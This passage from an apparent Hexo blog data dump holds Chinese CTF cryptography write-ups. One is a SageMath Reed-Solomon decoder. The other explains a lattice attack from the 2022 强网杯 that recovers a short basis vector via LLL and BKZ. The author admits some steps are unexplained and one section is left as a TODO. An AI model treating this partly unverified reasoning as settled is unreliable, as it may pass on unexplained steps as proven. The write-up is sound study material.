class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decode_block</span>(<span class=\"params\">r_x</span>):</span><br><span class=\"line\">    S = [PR(r_x)(alpha^i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>)]</span><br><span class=\"line\">    nu = <span class=\"number\">2</span></span><br><span class=\"line\">    A = matrix(F,nu,nu)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nu):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nu):</span><br><span class=\"line\">            A[i,j] = S[i+j]</span><br><span class=\"line\">    b = vector(F,[-S[nu+i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nu)])</span><br><span class=\"line\">    x = <span class=\"built_in\">list</span>(A.solve_right(b))</span><br><span class=\"line\">    x.append(<span class=\"number\">1</span>)</span><br><span class=\"line\">    x.reverse()</span><br><span class=\"line\">    Lambda = PR(x)</span><br><span class=\"line\">    I = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> Lambda(alpha^(-i))==<span class=\"number\">0</span>:</span><br><span class=\"line\">            I.append(i)</span><br><span class=\"line\">    I = I + [<span class=\"number\">0</span>] * (<span class=\"number\">2</span> - <span class=\"built_in\">len</span>(I))</span><br><span class=\"line\">    X = [alpha^I[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\">    A = matrix(F,<span class=\"number\">2</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">            A[i,j] = X[j]^i</span><br><span class=\"line\">    b = <span class=\"built_in\">list</span>(A.solve_right(vector(F,S[:<span class=\"number\">2</span>])))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(I)):</span><br><span class=\"line\">        r_x[I[i]] -= b[i]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r_x[<span class=\"number\">4</span>:]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/104306038\">https://zhuanlan.zhihu.com/p/104306038</a></li>\n<li><a href=\"https://eprint.iacr.org/2017/733.pdf\">https://eprint.iacr.org/2017/733.pdf</a></li>\n</ul>\n","excerpt":"<p>终于有时间整理一下了，爆破毕竟还是太粗鲁了。</p>","more":"<p>羊城杯的一道题，题目中只破坏了消息的随机两个位置，消息又在 256 以内，所以可以直接暴力枚举。<br>下面探寻优雅点的解法。</p>\n<h2 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h2><p>先来看看题目的代码，如下是编码的核心函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m = <span class=\"number\">257</span></span><br><span class=\"line\">F = Zmod(m)</span><br><span class=\"line\">alpha = F(<span class=\"number\">223</span>)</span><br><span class=\"line\">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class=\"line\">gx = (x - alpha ^ <span class=\"number\">0</span>) * (x - alpha ^ <span class=\"number\">1</span>) * (x - alpha ^ <span class=\"number\">2</span>) * (x - alpha ^ <span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encode_block</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> <span class=\"built_in\">isinstance</span>(message, <span class=\"built_in\">list</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    f = PR([<span class=\"number\">0</span>] * <span class=\"number\">4</span> + message)</span><br><span class=\"line\">    px = f % gx</span><br><span class=\"line\">    mx = f - px</span><br><span class=\"line\">    c = [_ <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> mx]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> c + (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(c)) * [<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n\n<p>分析一下，代码中取一个生成多项式 $g(x)=(x-\\alpha^0)(x-\\alpha^1)(x-\\alpha^2)(x-\\alpha^3)$ ，然后将消息多项式 $M(x)$ 模 $g(x)$ ，得到余数多项式 $P(x)$ ，最后得到编码后的消息 $S(x)=M(x)-P(x)$ 。这时有 $S(x)\\equiv 0\\mod g(x)$ 。<br>这里解释一下各个参数，当时我也是看了好久 sagemath 的文档也没搞懂。<br>生成多项式 $g(x)=\\prod\\limits_{j=1}^{n-k}(x-\\alpha^j)$<br>// TODO</p>\n<h2 id=\"解码\"><a href=\"#解码\" class=\"headerlink\" title=\"解码\"></a>解码</h2><p>照着<a href=\"https://zhuanlan.zhihu.com/p/104306038\">这篇文章</a>搓了个 PGZ 解码器，代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decode_block</span>(<span class=\"params\">r_x</span>):</span><br><span class=\"line\">    S = [PR(r_x)(alpha^i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>)]</span><br><span class=\"line\">    nu = <span class=\"number\">2</span></span><br><span class=\"line\">    A = matrix(F,nu,nu)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nu):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nu):</span><br><span class=\"line\">            A[i,j] = S[i+j]</span><br><span class=\"line\">    b = vector(F,[-S[nu+i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nu)])</span><br><span class=\"line\">    x = <span class=\"built_in\">list</span>(A.solve_right(b))</span><br><span class=\"line\">    x.append(<span class=\"number\">1</span>)</span><br><span class=\"line\">    x.reverse()</span><br><span class=\"line\">    Lambda = PR(x)</span><br><span class=\"line\">    I = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> Lambda(alpha^(-i))==<span class=\"number\">0</span>:</span><br><span class=\"line\">            I.append(i)</span><br><span class=\"line\">    I = I + [<span class=\"number\">0</span>] * (<span class=\"number\">2</span> - <span class=\"built_in\">len</span>(I))</span><br><span class=\"line\">    X = [alpha^I[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\">    A = matrix(F,<span class=\"number\">2</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">            A[i,j] = X[j]^i</span><br><span class=\"line\">    b = <span class=\"built_in\">list</span>(A.solve_right(vector(F,S[:<span class=\"number\">2</span>])))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(I)):</span><br><span class=\"line\">        r_x[I[i]] -= b[i]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r_x[<span class=\"number\">4</span>:]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/104306038\">https://zhuanlan.zhihu.com/p/104306038</a></li>\n<li><a href=\"https://eprint.iacr.org/2017/733.pdf\">https://eprint.iacr.org/2017/733.pdf</a></li>\n</ul>"},{"title":"2022强网杯 Crypto","date":"2022-08-08T02:03:00.000Z","_content":"\n当场做是做不出来的，赛后分析学学吧，不定期更新。\n<!--more-->\n\n## Lattice\n\n```python\nfrom sage.modules.free_module_integer import IntegerLattice\nfrom Crypto.Cipher import AES\nfrom base64 import b64encode\nfrom hashlib import *\nfrom secret import flag\nimport signal\n\nn = 75\nm = 150\nr = 10\nN = 126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109\n\ndef gen(n, m, r, N):\n    t1 = [ZZ.random_element(-2^15, 2^15) for _ in range(n*m)]\n    t2 = [ZZ.random_element(N) for _ in range(r*n)]\n    B = matrix(ZZ, n, m, t1)        # B为75*150的矩阵\n    L = IntegerLattice(B)\n    A = matrix(ZZ, r, n, t2)        # A为10*75的矩阵\n    C = (A * B) % N                 # C为10*150的矩阵\n    return L, C\n\ndef pad(s):\n    return s + (16 - len(s) % 16) * b\"\\x00\"\n\nsignal.alarm(60)\ntoken = input(\"team token:\").strip().encode()\nL, C = gen(n, m, r, N)\nprint(C)\nkey = sha256(str(L.reduced_basis[0]).encode()).digest()\naes = AES.new(key, AES.MODE_ECB)\nct = b64encode(aes.encrypt(pad(flag))).decode()\nprint(ct)\n```\n\n题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB(mod\\ N)$ ，需要我们恢复出原来格$B$的最短向量。\n\n比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。\n赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。\n\nexp中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：\n$$\nA=\n\\left(\n\\begin{array}{cccc|cccc}\n1 & 0 & \\cdots & 0 & 2^{200}\\cdot c_{0,0} & 2^{200}\\cdot c_{1,0} & \\cdots & 2^{200}\\cdot c_{9,0} \\\\\\\\\n0 & 1 & \\cdots & 0 & 2^{200}\\cdot c_{0,1} & 2^{200}\\cdot c_{1,1} & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & 0 \\\\\\\\\n0 & 0 & \\cdots & 1 & 2^{200}\\cdot c_{0,149} & 2^{200}\\cdot c_{1,149} & \\cdots & 2^{200}\\cdot c_{9,149} \\\\\\\\ \\hline\n0 & 0 & \\cdots & 0 & 2^{200}\\cdot N & 0 & \\cdots & 0 \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 2^{200}\\cdot N & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 0 & \\cdots & 2^{200}\\cdot N\n\\end{array}\n\\right)\n$$\n可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。\n$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。\n> 这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。\n\n那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$\n至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。\n例如如下一个矩阵求逆\n$$\nM=\n\\begin{pmatrix}\n1 & -4 & -3 \\\\\\\\\n1 & -5 & -3 \\\\\\\\\n-1 & 6 & 4\n\\end{pmatrix}\n$$\n在右边补上一个单位阵，得到\n$$\nA=\n\\left(\n\\begin{array}{ccc|ccc}\n1 & -4 & -3 & 1 & 0 & 0 \\\\\\\\\n1 & -5 & -3 & 0 & 1 & 0 \\\\\\\\\n-1 & 6 & 4 & 0 & 0 & 1\n\\end{array}\n\\right)\n\\stackrel{初等行变换}{\\longrightarrow}\n\\left(\n\\begin{array}{ccc|ccc}\n1 & 0 & 0 & 2 & 2 & 3 \\\\\\\\\n0 & 1 & 0 & 1 & -1 & 0 \\\\\\\\\n0 & 0 & 1 & -1 & 2 & 1\n\\end{array}\n\\right)\n$$\n此时右边的矩阵 $M^{-1}$ 即为所求\n究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为\n$$\nM^{-1}\n\\left[\n    M\\enspace I\n\\right] =\n\\left[\n    I\\enspace M^{-1}\n\\right]\n$$\n回到题目中来，有\n$$\nL\n\\left[\n    I \\enspace C^T\n\\right]\n \\enspace \\% \\enspace N=\n\\left[\n\\begin{matrix}\n    B & O \\\\\\\\\n    R & S\n\\end{matrix}\n\\right]\n$$\n至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测\n$$\nL=\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]\n,LC^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right]\n(mod\\ N)\n$$\n即有\n$$\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]C^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right](mod\\ N)\n$$\n得到 $BC^T=O\\ (mod\\ N)$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下\n\n记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有\n $\\mathcal{A}\\mathcal{B} = C\\ (mod\\ N)$\n若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\ (mod\\ N)$ ，则 $B$ 和 $C^T$ 互为左右零空间。\n因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\ (mod\\ N)$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。\n接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。\n\n至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。\n","source":"_posts/2022强网杯 Crypto.md","raw":"---\ntitle: 2022强网杯 Crypto\ndate: 2022-08-08 10:03:00\ntags: [CTF, 密码学]\ncategories: 题解\n---\n\n当场做是做不出来的，赛后分析学学吧，不定期更新。\n<!--more-->\n\n## Lattice\n\n```python\nfrom sage.modules.free_module_integer import IntegerLattice\nfrom Crypto.Cipher import AES\nfrom base64 import b64encode\nfrom hashlib import *\nfrom secret import flag\nimport signal\n\nn = 75\nm = 150\nr = 10\nN = 126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109\n\ndef gen(n, m, r, N):\n    t1 = [ZZ.random_element(-2^15, 2^15) for _ in range(n*m)]\n    t2 = [ZZ.random_element(N) for _ in range(r*n)]\n    B = matrix(ZZ, n, m, t1)        # B为75*150的矩阵\n    L = IntegerLattice(B)\n    A = matrix(ZZ, r, n, t2)        # A为10*75的矩阵\n    C = (A * B) % N                 # C为10*150的矩阵\n    return L, C\n\ndef pad(s):\n    return s + (16 - len(s) % 16) * b\"\\x00\"\n\nsignal.alarm(60)\ntoken = input(\"team token:\").strip().encode()\nL, C = gen(n, m, r, N)\nprint(C)\nkey = sha256(str(L.reduced_basis[0]).encode()).digest()\naes = AES.new(key, AES.MODE_ECB)\nct = b64encode(aes.encrypt(pad(flag))).decode()\nprint(ct)\n```\n\n题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB(mod\\ N)$ ，需要我们恢复出原来格$B$的最短向量。\n\n比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。\n赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。\n\nexp中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：\n$$\nA=\n\\left(\n\\begin{array}{cccc|cccc}\n1 & 0 & \\cdots & 0 & 2^{200}\\cdot c_{0,0} & 2^{200}\\cdot c_{1,0} & \\cdots & 2^{200}\\cdot c_{9,0} \\\\\\\\\n0 & 1 & \\cdots & 0 & 2^{200}\\cdot c_{0,1} & 2^{200}\\cdot c_{1,1} & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & 0 \\\\\\\\\n0 & 0 & \\cdots & 1 & 2^{200}\\cdot c_{0,149} & 2^{200}\\cdot c_{1,149} & \\cdots & 2^{200}\\cdot c_{9,149} \\\\\\\\ \\hline\n0 & 0 & \\cdots & 0 & 2^{200}\\cdot N & 0 & \\cdots & 0 \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 2^{200}\\cdot N & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 0 & \\cdots & 2^{200}\\cdot N\n\\end{array}\n\\right)\n$$\n可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。\n$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。\n> 这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。\n\n那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$\n至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。\n例如如下一个矩阵求逆\n$$\nM=\n\\begin{pmatrix}\n1 & -4 & -3 \\\\\\\\\n1 & -5 & -3 \\\\\\\\\n-1 & 6 & 4\n\\end{pmatrix}\n$$\n在右边补上一个单位阵，得到\n$$\nA=\n\\left(\n\\begin{array}{ccc|ccc}\n1 & -4 & -3 & 1 & 0 & 0 \\\\\\\\\n1 & -5 & -3 & 0 & 1 & 0 \\\\\\\\\n-1 & 6 & 4 & 0 & 0 & 1\n\\end{array}\n\\right)\n\\stackrel{初等行变换}{\\longrightarrow}\n\\left(\n\\begin{array}{ccc|ccc}\n1 & 0 & 0 & 2 & 2 & 3 \\\\\\\\\n0 & 1 & 0 & 1 & -1 & 0 \\\\\\\\\n0 & 0 & 1 & -1 & 2 & 1\n\\end{array}\n\\right)\n$$\n此时右边的矩阵 $M^{-1}$ 即为所求\n究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为\n$$\nM^{-1}\n\\left[\n    M\\enspace I\n\\right] =\n\\left[\n    I\\enspace M^{-1}\n\\right]\n$$\n回到题目中来，有\n$$\nL\n\\left[\n    I \\enspace C^T\n\\right]\n \\enspace \\% \\enspace N=\n\\left[\n\\begin{matrix}\n    B & O \\\\\\\\\n    R & S\n\\end{matrix}\n\\right]\n$$\n至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测\n$$\nL=\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]\n,LC^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right]\n(mod\\ N)\n$$\n即有\n$$\n\\left[\n\\begin{matrix}\n    B \\\\\\\\\n    R\n\\end{matrix}\n\\right]C^T=\n\\left[\n\\begin{matrix}\n    O \\\\\\\\\n    S\n\\end{matrix}\n\\right](mod\\ N)\n$$\n得到 $BC^T=O\\ (mod\\ N)$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下\n\n记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有\n $\\mathcal{A}\\mathcal{B} = C\\ (mod\\ N)$\n若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\ (mod\\ N)$ ，则 $B$ 和 $C^T$ 互为左右零空间。\n因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\ (mod\\ N)$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。\n接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。\n\n至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。\n","slug":"2022强网杯 Crypto","published":1,"updated":"2022-11-27T11:46:18.062Z","_id":"clazajjqr0000yo6g7vpt47ot","comments":1,"layout":"post","photos":[],"link":"","content":"<p>当场做是做不出来的，赛后分析学学吧，不定期更新。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Lattice\"><a href=\"#Lattice\" class=\"headerlink\" title=\"Lattice\"></a>Lattice</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.modules.free_module_integer <span class=\"keyword\">import</span> IntegerLattice</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64encode</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">75</span></span><br><span class=\"line\">m = <span class=\"number\">150</span></span><br><span class=\"line\">r = <span class=\"number\">10</span></span><br><span class=\"line\">N = <span class=\"number\">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gen</span>(<span class=\"params\">n, m, r, N</span>):</span><br><span class=\"line\">    t1 = [ZZ.random_element(-<span class=\"number\">2</span>^<span class=\"number\">15</span>, <span class=\"number\">2</span>^<span class=\"number\">15</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n*m)]</span><br><span class=\"line\">    t2 = [ZZ.random_element(N) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(r*n)]</span><br><span class=\"line\">    B = matrix(ZZ, n, m, t1)        <span class=\"comment\"># B为75*150的矩阵</span></span><br><span class=\"line\">    L = IntegerLattice(B)</span><br><span class=\"line\">    A = matrix(ZZ, r, n, t2)        <span class=\"comment\"># A为10*75的矩阵</span></span><br><span class=\"line\">    C = (A * B) % N                 <span class=\"comment\"># C为10*150的矩阵</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> L, C</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s + (<span class=\"number\">16</span> - <span class=\"built_in\">len</span>(s) % <span class=\"number\">16</span>) * <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">signal.alarm(<span class=\"number\">60</span>)</span><br><span class=\"line\">token = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;team token:&quot;</span>).strip().encode()</span><br><span class=\"line\">L, C = gen(n, m, r, N)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(C)</span><br><span class=\"line\">key = sha256(<span class=\"built_in\">str</span>(L.reduced_basis[<span class=\"number\">0</span>]).encode()).digest()</span><br><span class=\"line\">aes = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">ct = b64encode(aes.encrypt(pad(flag))).decode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ct)</span><br></pre></td></tr></table></figure>\n\n<p>题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB(mod\\ N)$ ，需要我们恢复出原来格$B$的最短向量。</p>\n<p>比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。<br>赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。</p>\n<p>exp中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：<br>$$<br>A=<br>\\left(<br>\\begin{array}{cccc|cccc}<br>1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,0} &amp; 2^{200}\\cdot c_{1,0} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,0} 